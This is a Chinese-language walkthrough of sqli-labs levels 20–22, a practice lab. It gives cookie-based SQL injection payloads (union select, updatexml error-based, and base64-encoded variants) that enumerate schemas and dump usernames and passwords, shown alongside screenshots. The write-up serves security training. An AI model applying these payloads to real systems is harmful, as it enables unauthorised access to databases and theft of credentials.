
# Sqli-labs-Less-20
**使用admin登录**<br />1.登录成功之后会显示cookie<br />2. 登录失败会显示失败信息。<br />![](https://img-blog.csdnimg.cn/20200720155032941.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=ca1hD&originHeight=361&originWidth=1189&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**说明我们需要修改Cookie来进行注入，使用burp抓包**

在coolie值后面加一个'报错，说明存在注入<br />![](https://img-blog.csdnimg.cn/20200720155438903.png#crop=0&crop=0&crop=1&crop=1&id=KxiJD&originHeight=63&originWidth=193&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库**<br />Cookie: uname= ' union select 1,2,database()--+（建议使用#，--+不一定适用）<br />![](https://img-blog.csdnimg.cn/2020072015593622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=paop9&originHeight=585&originWidth=1645&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**也可使用Sqli-labs-Less-18中注入的方式**<br />Cookie: uname= ' or updatexml(1,(concat(0x7e,(select database()),0x7e)),1) and '1'='1<br />![](https://img-blog.csdnimg.cn/20200720160142227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Y2tbO&originHeight=515&originWidth=1859&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查看所有库**<br />Cookie: uname= ' union select 1,2,group_concat(schema_name) from information_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200720160527169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=NxAEs&originHeight=647&originWidth=1911&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看security里面所有表**<br />Cookie: uname= ' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+<br />![](https://img-blog.csdnimg.cn/20200720160649826.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Ds9j5&originHeight=637&originWidth=1762&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查看users里面所有字段**<br />Cookie: uname= ' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+<br />![](https://img-blog.csdnimg.cn/20200720160800601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=TYoBr&originHeight=712&originWidth=1899&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看users里面所有账户和密码**<br />Cookie: uname= ' union select 1,2,group_concat(concat_ws('~',username,password)) from security.users--+<br />![](https://img-blog.csdnimg.cn/20200720160949979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=yyiB0&originHeight=621&originWidth=1894&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**以此类推爆出所有数据。**


# Sqli-labs-Less-21
使用admin进行登录<br />1.登录成功之后会显示一系列信息<br />2. 登录失败会显示失败信息。<br />登录后发现uname的值不是admin而是看不懂的字符<br />![](https://img-blog.csdnimg.cn/20200720161710326.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Ac5i3&originHeight=383&originWidth=1149&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

这是将admin进行base64转码 YWRtaW4= 解码之后为admin<br />和第20关相似，只不过这一次将admin进行base64转码

**使用burp抓包**<br />![](https://img-blog.csdnimg.cn/2020072016313368.png#crop=0&crop=0&crop=1&crop=1&id=ACyB7&originHeight=196&originWidth=591&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

在admin后面加上'并进行编码<br />![](https://img-blog.csdnimg.cn/20200720163401296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=UeRqH&originHeight=591&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

发送后报错,显示还需要一个)
![](https://img-blog.csdnimg.cn/20200720163455724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=lDyfG&originHeight=207&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**显示当前数据库**<br />编码前：') union select 1,2,database() #<br />编码后:JykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpICM=<br />![](https://img-blog.csdnimg.cn/20200720164044663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=rzXOO&originHeight=652&originWidth=1743&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
以下步骤与Sqli-labs-Less-20相似<br />注意：<br />在Sqli-labs-Less-21中是'）并且需要编码<br />在Sqli-labs-Less-20中是'不需要编码


# Sqli-labs-Less-22
这一关与20关相似<br />只不过这一次将')换为"并编码即可

**查找注入点**<br />编码前：admin'<br />编码后：YWRtaW4n<br />未登录并没有提醒<br />![](https://img-blog.csdnimg.cn/20200720170910302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=wSAl5&originHeight=367&originWidth=1180&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

编码前：admin"<br />编码后：YWRtaW4i<br />报错<br />![](https://img-blog.csdnimg.cn/20200720171107870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=BjuyI&originHeight=259&originWidth=1317&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**加上注释**<br />编码前：admin"#<br />编码后：YWRtaW4iIw==<br />成功登录说明存在注入点<br />![](https://img-blog.csdnimg.cn/20200720171159574.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=RprmN&originHeight=294&originWidth=1144&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前数据库**<br />编码前：" union select 1,2,database()#<br />编码后：IiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj<br />![](https://img-blog.csdnimg.cn/20200720171317259.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=xvNqf&originHeight=247&originWidth=1257&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
以下步骤与Sqli-labs-Less-20相似<br />注意：<br />Sqli-labs-Less-20是'不需要编码<br />Sqli-labs-Less-22是"并且需要编码
